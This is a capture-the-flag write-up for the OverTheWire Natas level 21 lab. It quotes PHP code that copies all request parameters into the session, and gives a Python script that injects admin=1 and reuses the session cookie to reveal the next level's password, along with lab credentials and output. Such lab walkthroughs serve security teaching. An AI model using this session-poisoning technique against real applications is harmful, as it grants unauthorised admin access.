# Natas21

*	user: `natas21`
*	pass: `IFekPyrQXftziDEsUr3x21sYuahypdgJ`
*	url:
	*	[http://natas21.natas.labs.overthewire.org](http://natas21:IFekPyrQXftziDEsUr3x21sYuahypdgJ@natas21.natas.labs.overthewire.org)
	*	[http://natas21-experimenter.natas.labs.overthewire.org](http://natas21:IFekPyrQXftziDEsUr3x21sYuahypdgJ@natas21-experimenter.natas.labs.overthewire.org)
*	flag: `chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ`

## Procedure

1.	Function `print_credentials()` in main page, checks if `$_SESSION`
	has `admin` parameter and if its value is equal to `1`

		if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
			print "You are an admin. The credentials for the next level are:<br>";
			print "<pre>Username: natas22\n";
			print "Password: <censored></pre>";
		} else {
			print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas22.";
		}

2.	In "experimenter" page, if `$_REQUEST` contains `submit` key, all
	the contained attributes are saved in `$_SESSION`

		if(array_key_exists("submit", $_REQUEST)) {
			foreach($_REQUEST as $key => $val) {
				$_SESSION[$key] = $val;
			}
		}

3.	Well, the attack is defined. By passing `admin=1` in experimenter
	page, we will be able to get password for Natas22. Python
	[natas21.py](./scripts/natas21.py) will help us

		import requests

		target = 'http://natas21-experimenter.natas.labs.overthewire.org'
		auth = ('natas21', 'IFekPyrQXftziDEsUr3x21sYuahypdgJ')

		params = dict(debug='', submit='', admin=1)
		#                                  ^^^^^^^ <- this is the trick
		cookies = dict()
		r = requests.get(target, auth=auth, params=params, cookies=cookies)
		phpsessid = r.cookies['PHPSESSID']
		print r.text

		target = 'http://natas21.natas.labs.overthewire.org'
		params = dict(debug='')
		cookies = dict(PHPSESSID=phpsessid)
		r = requests.get(target, auth=auth, params=params, cookies=cookies)
		print r.text

	Let's try

		$ python natas21.py
		<html>

		[cut]

		</p>
		[DEBUG] Session contents:<br>Array
		(
		    [admin] => 1
		    [debug] =>
		    [submit] =>
		)

		<p>Example:</p>

		[cut]

		</html>

		<html>

		[cut]

		You are an admin. The credentials for the next level are:<br><pre>Username: natas22
		Password: chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ</pre>

		[cut]

		</html>

